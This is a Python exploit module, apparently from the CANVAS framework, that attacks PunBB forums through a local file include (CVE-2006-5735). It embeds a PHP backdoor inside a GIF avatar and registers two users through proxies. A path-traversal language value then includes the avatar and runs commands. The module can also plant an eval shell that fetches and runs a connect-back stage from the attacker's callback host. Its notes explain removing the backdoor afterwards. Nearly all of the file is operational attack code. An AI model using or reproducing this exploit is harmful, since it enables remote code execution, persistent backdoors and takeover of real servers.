#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

# python imports
import sys
import string
import re
import random

# path appends
if '.' not in sys.path: 
	sys.path.append('.')

# CANVAS imports
from exploitutils import *
from tcpexploit import tcpexploit
import libs.spkproxy as spkproxy
import urllib
import canvasengine
from phplistener import get_php_stage1

NAME="punbb_langexec"
DESCRIPTION="PunBB user language include => code execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="informer.com"
DOCUMENTATION["References"]='http://www.wargan.org/index.php/2006/10/29/4-punbb-1213-multiple-vulnerabilities'
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = 'CVE-2006-5735'
DOCUMENTATION["CVE Url"] = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5735'
DOCUMENTATION['CVSS'] = 7.5
VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
Requires proxy usage to bypass the user/ip limitation:
proxy -> register user/upload avatar
proxy2 -> register new user and include avatar from first user to gain code execution

PunBB => 1.2.12 Local File Include => code execution
http://www.wargan.org/index.php/2006/10/29/4-punbb-1213-multiple-vulnerabilities

Commandline example:
./exploits/punbb_langexec/punbb_langexec.py -v 0 -t xxx.xxx.com -O command:id -O first_proxy:127.0.0.1:8080 -O second_proxy:127.0.0.1:8081

Cleanup:                                                                       
                                                                               
[C] (66.165.169.5/32) UserID found: 140                                        
                                                                               
... once you're on the machine:                                                
                                                                               
$ pwd                                                                          
/var/www/punn/upload/img/avatars                                               
$ rm 140.gif <- uid.gif has your php backdoor                                  
                                                                               
"""

CHANGELOG="""

"""


#GIF with PHP data in XIFF metadata
SHELL = chr(0x47)+chr(0x49)+chr(0x46)+chr(0x38)+chr(0x39)+chr(0x61)+\
	 chr(0x01)+chr(0x00)+chr(0x01)+chr(0x00)+chr(0xf7)+chr(0x00)+\
	 chr(0x00)+chr(0xa4)+chr(0xb6)+chr(0xa4)+chr(0x16)+chr(0x00)+\
	 chr(0x00)+chr(0xf4)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
	 chr(0x00)+chr(0x6b)+chr(0x00)+chr(0x4c)+chr(0x15)+chr(0x00)+\
	 chr(0x00)+chr(0xf4)+chr(0x00)+chr(0x69)+chr(0x77)+chr(0x00)+\
	 chr(0x00)+chr(0xf8)+chr(0x00)+chr(0x6e)+chr(0x62)+chr(0x00)+\
	 chr(0x00)+chr(0x15)+chr(0x00)+chr(0x67)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x34)+chr(0x00)+chr(0x75)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x61)+chr(0xc0)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x89)+chr(0x00)+chr(0x00)+chr(0x1c)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0xa9)+chr(0x00)+chr(0x00)+chr(0x20)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x6f)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x56)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+\
"""<?php 
error_reporting(0);
ini_set('max_execution_time',0);
print '---1243---';
passthru(base64_decode($_GET[HTTP_SERVER_INFO]));
if(isset($_GET[HTTP_SERVER_INFO2])){
$fh = fopen("img/avatars/shell.php","w");
fwrite($fh,'<? eval(base64_decode($_GET[page])); ?>');
fclose($fh);
}
print '---3421---';
exit;
?>"""+\
	 chr(0x38)+chr(0x00)+chr(0x00)+chr(0xe5)+chr(0x00)+\
	 chr(0x00)+chr(0x12)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x98)+chr(0x01)+chr(0x00)+\
	 chr(0xcc)+chr(0x00)+chr(0x00)+chr(0x15)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x58)+chr(0x00)+chr(0x10)+chr(0xe6)+chr(0x00)+\
	 chr(0x04)+chr(0x12)+chr(0x00)+chr(0x10)+chr(0x00)+chr(0x00)+\
	 chr(0x04)+chr(0x05)+chr(0x00)+chr(0x01)+chr(0x90)+chr(0x00)+\
	 chr(0x00)+chr(0xf6)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
	 chr(0x00)+chr(0xc8)+chr(0x00)+chr(0x10)+chr(0xd5)+chr(0x00)+\
	 chr(0xe8)+chr(0xf5)+chr(0x00)+chr(0x12)+chr(0x77)+chr(0x00)+\
	 chr(0x00)+chr(0xff)+chr(0x00)+chr(0x13)+chr(0xff)+chr(0x00)+\
	 chr(0x6c)+chr(0xff)+chr(0x00)+chr(0x6c)+chr(0xff)+chr(0x00)+\
	 chr(0x74)+chr(0x6a)+chr(0x00)+chr(0x03)+chr(0x16)+chr(0x00)+\
	 chr(0x00)+chr(0xf4)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
	 chr(0x00)+chr(0xc4)+chr(0x00)+chr(0x30)+chr(0x1e)+chr(0x00)+\
	 chr(0x75)+chr(0xe5)+chr(0x00)+chr(0x15)+chr(0x77)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x15)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0xdc)+chr(0x00)+chr(0x00)+\
	 chr(0xe7)+chr(0x00)+chr(0x00)+chr(0x12)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x70)+chr(0x00)+chr(0x01)+chr(0x59)+chr(0x00)+\
	 chr(0x00)+chr(0x18)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x04)+chr(0x00)+chr(0x88)+chr(0x01)+chr(0x00)+\
	 chr(0xe8)+chr(0x05)+chr(0x00)+chr(0x12)+chr(0x01)+chr(0x00)+\
	 chr(0x00)+chr(0x6c)+chr(0x00)+chr(0x04)+chr(0xe3)+chr(0x00)+\
	 chr(0x42)+chr(0x12)+chr(0x00)+chr(0x6e)+chr(0x00)+chr(0x00)+\
	 chr(0x74)+chr(0x7e)+chr(0x00)+chr(0x30)+chr(0x00)+chr(0x00)+\
	 chr(0x87)+chr(0x00)+chr(0x00)+chr(0x6e)+chr(0xc0)+chr(0x00)+\
	 chr(0x74)+chr(0x00)+chr(0x00)+chr(0xff)+chr(0x00)+chr(0x00)+\
	 chr(0xff)+chr(0x00)+chr(0x00)+chr(0xff)+chr(0x00)+chr(0x00)+\
	 chr(0xff)+chr(0xff)+chr(0x00)+chr(0xd6)+chr(0xff)+chr(0x00)+\
	 chr(0x32)+chr(0xff)+chr(0x00)+chr(0x6e)+chr(0xff)+chr(0x00)+\
	 chr(0x74)+chr(0xff)+chr(0x00)+chr(0x6c)+chr(0xff)+chr(0x00)+\
	 chr(0x5b)+chr(0xff)+chr(0x00)+chr(0xe5)+chr(0xff)+chr(0x00)+\
	 chr(0x77)+chr(0x00)+chr(0x00)+chr(0x53)+chr(0x00)+chr(0x00)+\
	 chr(0x15)+chr(0x00)+chr(0x00)+chr(0x53)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x07)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x6b)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x58)+chr(0x00)+chr(0x00)+chr(0x03)+chr(0x00)+\
	 chr(0xf0)+chr(0x00)+chr(0x00)+chr(0x15)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x06)+chr(0x00)+chr(0x00)+chr(0xf6)+chr(0x00)+\
	 chr(0x00)+chr(0xe4)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
	 chr(0x00)+chr(0x0f)+chr(0x00)+chr(0x00)+chr(0x1e)+chr(0x00)+\
	 chr(0x00)+chr(0xe5)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x01)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0xf8)+chr(0x74)+chr(0x00)+chr(0x62)+chr(0xe7)+\
	 chr(0x00)+chr(0x01)+chr(0x12)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0xc8)+chr(0x68)+chr(0x00)+chr(0x28)+\
	 chr(0x32)+chr(0x15)+chr(0xe5)+chr(0xe6)+chr(0x00)+chr(0x77)+\
	 chr(0x77)+chr(0xa4)+chr(0x00)+chr(0xff)+chr(0xe5)+chr(0x00)+\
	 chr(0xff)+chr(0x12)+chr(0x00)+chr(0xff)+chr(0x00)+chr(0x00)+\
	 chr(0xff)+chr(0x00)+chr(0x00)+chr(0x6c)+chr(0x00)+chr(0x00)+\
	 chr(0x5b)+chr(0x00)+chr(0x00)+chr(0xe5)+chr(0x00)+chr(0x00)+\
	 chr(0x77)+chr(0xfc)+chr(0xf8)+chr(0x36)+chr(0xf7)+chr(0x62)+\
	 chr(0x00)+chr(0x12)+chr(0x15)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x05)+chr(0x00)+chr(0x36)+chr(0x90)+chr(0x01)+\
	 chr(0x00)+chr(0xf6)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
	 chr(0x00)+chr(0xc8)+chr(0x04)+chr(0xd8)+chr(0xd5)+chr(0x29)+\
	 chr(0xed)+chr(0xf5)+chr(0xe5)+chr(0x12)+chr(0x77)+chr(0x77)+\
	 chr(0x00)+chr(0xff)+chr(0x94)+chr(0xff)+chr(0xff)+chr(0xe7)+\
	 chr(0xff)+chr(0xff)+chr(0x12)+chr(0xff)+chr(0xff)+chr(0x00)+\
	 chr(0xff)+chr(0x6a)+chr(0x64)+chr(0x00)+chr(0x16)+chr(0x2f)+\
	 chr(0x00)+chr(0xf4)+chr(0xe6)+chr(0x00)+chr(0x77)+chr(0x77)+\
	 chr(0x00)+chr(0xe0)+chr(0x00)+chr(0x9c)+chr(0x18)+chr(0x00)+\
	 chr(0xe8)+chr(0xe5)+chr(0x00)+chr(0x12)+chr(0x77)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0xff)+chr(0x4e)+chr(0x00)+chr(0xff)+\
	 chr(0x21)+chr(0x15)+chr(0xff)+chr(0x4c)+chr(0x00)+chr(0xff)+\
	 chr(0x00)+chr(0x00)+chr(0x6f)+chr(0x7c)+chr(0x00)+chr(0x10)+\
	 chr(0xe8)+chr(0x00)+chr(0xe5)+chr(0x12)+chr(0x00)+chr(0x77)+\
	 chr(0x00)+chr(0xf8)+chr(0x00)+chr(0x7b)+chr(0x62)+chr(0x00)+\
	 chr(0xe0)+chr(0x15)+chr(0x00)+chr(0x4e)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x98)+chr(0xb0)+chr(0x01)+chr(0xe8)+\
	 chr(0xe8)+chr(0x00)+chr(0x12)+chr(0x12)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x64)+chr(0x98)+chr(0x6f)+chr(0x2f)+chr(0x10)+\
	 chr(0x10)+chr(0xe6)+chr(0xe5)+chr(0xe5)+chr(0x77)+chr(0x77)+\
	 chr(0x77)+chr(0x00)+chr(0x10)+chr(0x52)+chr(0x00)+chr(0xe4)+\
	 chr(0xe9)+chr(0x00)+chr(0x4e)+chr(0x12)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x61)+chr(0x20)+chr(0xc8)+chr(0x00)+chr(0x02)+\
	 chr(0xff)+chr(0x6c)+chr(0x4f)+chr(0xff)+chr(0x00)+chr(0x00)+\
	 chr(0x7f)+chr(0x69)+chr(0x00)+chr(0x1c)+chr(0x00)+chr(0x01)+\
	 chr(0xe9)+chr(0x61)+chr(0x00)+chr(0x12)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x29)+chr(0x94)+chr(0x00)+chr(0x00)+chr(0xe7)+\
	 chr(0x00)+chr(0x00)+chr(0x12)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x6f)+chr(0x00)+chr(0x01)+\
	 chr(0x10)+chr(0x00)+chr(0x00)+chr(0xe5)+chr(0x00)+chr(0x00)+\
	 chr(0x77)+chr(0x00)+chr(0xa0)+chr(0x00)+chr(0x00)+chr(0x3a)+\
	 chr(0x00)+chr(0x00)+chr(0x50)+chr(0x00)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x01)+chr(0x00)+chr(0x30)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x69)+\
	 chr(0x00)+chr(0x00)+chr(0x61)+chr(0x60)+chr(0x00)+chr(0x74)+\
	 chr(0xf1)+chr(0x00)+chr(0x74)+chr(0x15)+chr(0x00)+chr(0x69)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0xf0)+chr(0x00)+chr(0x00)+\
	 chr(0xaa)+chr(0x00)+chr(0x02)+chr(0x47)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x21)+chr(0xf9)+chr(0x04)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x2c)+chr(0x00)+chr(0x00)+\
	 chr(0x00)+chr(0x00)+chr(0x01)+chr(0x00)+chr(0x01)+chr(0x00)+\
	 chr(0x07)+chr(0x08)+chr(0x04)+chr(0x00)+chr(0x01)+chr(0x04)+\
	 chr(0x04)+chr(0x00)+chr(0x3b)+chr(0x00);

class theexploit(tcpexploit):
	def __init__(self):
		tcpexploit.__init__(self)

		self.port = 80
		self.host = ""
		self.badstring = "\x00"
		self.user1 = ''.join( random.Random().sample(string.lowercase, 6) )
		self.user2 = ''.join( random.Random().sample(string.lowercase, 6) )
		self.email = ''.join( random.Random().sample(string.lowercase, 6) )
		self.email2 = ''.join( random.Random().sample(string.lowercase, 6) )
		self.setVersions()
		self.version = 1
		self.done = 0
		self.name = NAME    
		self.basepath = "/"
		self.command = ""
		self.basicauth_user = ""
		self.basicauth_password = ""
		self.hostname = None
		
		# set to none for no-proxy by default ..
		self.first_proxy = None
		self.second_proxy = None
		
		return

	def usage(self):
		print "Base options:"
		print "-v <version> -t <target ip> -l <callback ip> -d <callback port>"
		print "Additional options:"
		print "-O basepath:basepath -O command:command -O basicauth_user:username -O basicauth_password:password -O hostname:hostname"
		return
	
	def getargs(self):
		"""
        Get arguments for attack
        """
		self.host = self.target.interface
		self.port = int(self.argsDict.get("port", self.port))
		
		self.basepath = self.argsDict.get("basepath", self.basepath)
		self.command = self.argsDict.get("command", self.command)
		self.basicauth_user = self.argsDict.get("basicauth_user", self.basicauth_user)
		self.basicauth_password = self.argsDict.get("basicauth_password", self.basicauth_password)
		self.hostname = self.argsDict.get("hostname", self.hostname)
		self.ssl = self.argsDict.get("ssl", self.ssl)
		
		# get proxies to use ..
		self.first_proxy = self.argsDict.get("first_proxy", self.first_proxy)
		self.second_proxy = self.argsDict.get("second_proxy", self.second_proxy)
		self.log("Got proxies: %s %s"% (self.first_proxy, self.second_proxy))
		
		if self.hostname in [None, ""]:
			allhosts = self.target.get_knowledge("www_hostnames")
			if allhosts == None:
				allhosts = ["%s"%self.host]
		else:
			allhosts = [self.hostname]
			
		self.allhosts = allhosts
		return 

	def displayVersions(self):
		for v in self.versions.keys():
			print "Version %d: %s"%(v,self.versions[v][0])

	def setVersions(self):
		self.versions = {}
		self.versions[1] = [""]

	def neededListenerTypes(self):
		return [canvasengine.PHPMULTI]

	def test(self):
		"""
        Quicky banner check - looks for comon basepaths
        """
		self.getargs()
		self.log("Using basepath=%s"%self.basepath)
		self.log("Using vhost=%s"%self.hostname)
		if self.ssl:
			protocol = "https"
		else:
			protocol = "http"

		for hostname in self.allhosts:
			self.log("Testing hostname: %s"%hostname)

			#automatically check out some common basepaths, starting with the one specified
			for basepath in [self.basepath, "/punn/upload/","/punbb/","/PunBB/","/board/","/forum/","/upload/","/"]:
				self.log("Testing for basepath: %s"%basepath)

				#If we have to do basic-auth, let's get an object from spkproxy here
				if self.basicauth_user:
					auth = spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
				else:
					auth = None 

				#this is the main call that does the magic here...
				fd = spkproxy.urlopen(protocol+"://"+self.host+':%s'%self.port+"/"+basepath, hostname=hostname, exploit=self, auth=auth)
				data = fd.read()

				#now that we have the web page - we parse it and look for vulnerable versions
				#list of vulnerable versions so far
				for s in ["PunBB"]:
					#self.log("Data=%s"%data) #print out web page (big)
					if s in data:
						self.log("Found Potential vulnerable PunBB in vhost %s at basepath %s"%(hostname, basepath))
						self.argsDict["basepath"] = basepath
						self.basepath = basepath
						self.hostname = hostname
						self.version = 1
						return 1
		return 0
	
	def do_url_connect(self, host_info, proxy=None):
		""" do basic http auth if needed .. connect to url """

		# ssl flag toggles to https
		if host_info['ssl']:
			protocol = "https"
		else:
			protocol = "http"

		#If we have to do basic-auth, let's get an object from spkproxy here
		if host_info['user']:
			auth = spkproxy.BasicAuth(host_info['user'], host_info['password'])
		else:
			auth = None

		if not proxy:
			UA = spkproxy.UserAgent(protocol+"://"+host_info['host']+':%s'% host_info['port']+"/"+host_info['basepath'], \
								auth=auth, hostname=host_info['hostname'], exploit=self)
		else:
			self.log("Using web proxy: %s"% proxy)
			UA = spkproxy.UserAgent(protocol+"://"+host_info['host']+':%s'% host_info['port']+"/"+host_info['basepath'], \
								auth=auth, hostname=host_info['hostname'], exploit=self, \
								proxyhost=proxy.split(':')[0], proxyport=int(proxy.split(':')[1]))			
		return UA

	def register_user(self, ua, host_info, form_data):
		""" register a user on the punbb .. use upper() so minor case changes don't trip our exploit up """
		
		ua.addHeader("Host","%s"%(host_info['host']))
		ua.addHeader("Referer","http://%s"%(host_info['host']))
		reply = ua.POST("register.php?action=register", form_data)
		
		# error checks .. upper() for case mismatches
		if reply.upper().count("Error registering new user".upper()):
			self.log("Error registering new user")
			return None
		if reply.upper().count("Someone else is already registered with that e-mail address. Please choose another".upper()):
			self.log("Someone else is already registered with that e-mail address. Please choose another")
			return None
		
		self.log("Data=%s"%reply)
		return reply
	
	def get_user_id(self, ua):
		""" get user id using useragent object """
		
		self.log("Getting UserID")
		user = ua.GET("index.php")
		p = re.compile("profile\.php\?id=(\d+)")
		match = p.search(user)
		if not match:
			self.log("No UserID Detected!")
			return None
		userid = match.group().split('=')[1]
		self.log("UserID found: %s"% userid)
		return userid
	
	def upload_avatar(self, ua, userid):
		""" upload avatar """
		fields = {}
		fields["form_sent"] = "sent"
		# SHELL is a global defined at the top of file
		files = [("req_file", "exploited.gif", SHELL)]
		# now upload the file
		ua.multipart("profile.php?action=upload_avatar&id=%s"% userid, fields, files)
		# XXX: lacks error check on upload
		return
	
	def do_command(self, ua, command, backshell):
		""" call a command via the placed php shell """

		ret = None
		
		if command not in ["", None]: # we have a single command to exec
			data = ua.GET("index.php?HTTP_SERVER_INFO=%s"%(urllib.quote_plus(command)))
			if "---1243---" in data:
				result = data.split("1243---")[1].split("---3421")[0]
				self.log("Command result=%s"%prettyprint(result))
				ret = 1
			else:
				self.log("Command not run - service patched?!")
		else: # we want a MOSDEF php thingamaging
			# place the backshell
			data = ua.GET("index.php?HTTP_SERVER_INFO2=%s"%(urllib.quote_plus(backshell)))
			# run the backshell
			data = ua.GET("img/avatars/shell.php?page=%s"%(urllib.quote_plus(backshell)))
			self.log("Looking for PHP connectback")
			ret = self.ISucceeded()
			
		return ret
	
	def log_out(self, ua, userid):
		self.log("Logging Out")
		data = ua.GET("login.php?action=out&id=%s"% userid)
		data = ua.GET("index.php")
		# XXX: lacks error check
		return
		
	def run(self):
		self.getargs()

		self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
		if self.version == 0:
			ret = self.test()
			if not ret:
				self.log("Testing didn't find vulnerable target")
				return 0

		self.log("Attacking %s:%d"%(self.host,self.port))
		self.log("Basic Auth User: %s"%self.basicauth_user)
		self.log("VHost: %s"%self.hostname)
		
		host_info = {}
		# set host info dict
		host_info['ssl'] = self.ssl
		host_info['user'] = self.basicauth_user
		host_info['password'] = self.basicauth_password
		host_info['host'] = self.host
		host_info['port'] = self.port
		host_info['hostname'] = self.hostname
		host_info['basepath'] = self.basepath
		
		# get a url agent object for first register .. these need to be proxied
		ua = self.do_url_connect(host_info, self.first_proxy)
			
		self.log("Registering First User")
		
		form_data = {}
		# register first user
		form_data["form_sent"] = "1"
		form_data["req_username"] = self.user1
		form_data["req_password1"] = "password123"
		form_data["req_password2"] = "password123"
		form_data["req_email1"] = "admin@"+self.email+".com"
		form_data["timezone"] = "-10"
		form_data["email_setting"] = "1"
		form_data["register"] = "Register"

		reply = self.register_user(ua, host_info, form_data)
		if reply in [None]:
			self.log("Failed to register first user ...")
			return 0

		userid = self.get_user_id(ua)
		if userid in [None]:
			self.log("Failed to get user id ...")
			return 0
		
		self.log("Uploading avatar")
		self.upload_avatar(ua, userid)
		
		# log out first user
		self.log_out(ua, userid)
		
		# init a new connection using a second proxy
		ua = self.do_url_connect(host_info, self.second_proxy)

		self.log("Registering Second User and Setting Language to First Users Avatar")
		
		form_data = {}
		form_data["form_sent"] = "1"
		form_data["req_username"] = self.user2
		form_data["req_password1"] = "password123"
		form_data["req_password2"] = "password123"
		form_data["req_email1"] = "admin@"+self.email2+".com"
		form_data["language"] = "../img/avatars/%s.gif\00"%(userid)
		form_data["timezone"] = "-10"
		form_data["email_setting"] = "1"
		form_data["register"] = "Register"

		reply = self.register_user(ua, host_info, form_data)
		if reply in [None]:
			self.log("Failed to register second user ...")
			return 0

		#we either do a command or a backshell
		if self.callback:
			backshell = b64encode(self.get_php_to_mosdef(self.callback.ip, self.callback.port))
			
		if self.command not in ["", None]:
			self.command = b64encode(self.command)
			backshell = None
			
		# do the command .. command of None will expect backshell to be set
		ret = self.do_command(ua, self.command, backshell)

		if ret:
			self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
		else:
			self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
			
		return ret

	def get_php_to_mosdef(self, host, port):
		"""
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """      
		self.log("Using PHPMULTI callback of %s:%d"% (host, port))
		badchars = ''
		ret = get_php_stage1(badchars, host, port)
		return ret

	def shutdown(self):
		self.done = 1

if __name__ == '__main__':
	print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
	app = theexploit()
	ret = standard_callback_commandline(app)
